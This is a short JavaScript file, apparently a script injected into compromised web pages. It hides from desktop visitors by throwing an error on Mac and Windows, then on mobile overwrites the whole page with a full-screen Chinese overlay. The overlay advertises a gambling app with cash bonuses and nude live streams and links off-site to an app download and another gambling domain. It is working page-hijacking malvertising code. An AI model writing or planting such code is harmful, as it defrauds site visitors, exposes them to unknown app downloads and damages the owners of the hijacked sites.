
addjs('https://hm.baidu.com/hm.js?1a69a290b4a00f35c039755766677e88');
function addjs(src) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = src;
    document.getElementsByTagName('head')[0].appendChild(script);
}
if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
    throw SyntaxError();
}
window.onload = function(){
    var meta = document.createElement("meta");
    meta.name = "viewport";
    meta.content = "initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
    document.getElementsByTagName('head')[0].appendChild(meta);
    document.body.innerHTML = "<style type=\'text/css\'>.guize_html{position:fixed;top:25%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>手机下载APP,立送106元彩金</h3><p>斗地主,炸金花,牛牛,麻将,捕鱼玩法众多</p><p>任意玩<b>两局</b>可直接提现彩金,另送美女裸播</p><img src=\'http://shtyjx.com/4/imgs/back.jpg\'width=\'248\'height=\'180\'/></div><a id=\'g_xz\' onclick=\'_hmt.push([\"_trackEvent\",\"app\",\"down\"," + '"' + window.location.host + '"' + ",\"1\"])\' class=\'btn\'href=\'http://shtyjx.com/4/?code=5e752ac9d3eca5cf\'rel=\'noreferrer\'target=\'_blank\'>下载试一下</a><a id=\'g_close\'class=\'btn\' rel=\'noreferrer\' href=\'https://vip.pai76.com:66/?c=4217\' onclick=\"setCookie(\'cc_cookie\', \'ok\', 1);\">确定</a></div></div>";
}
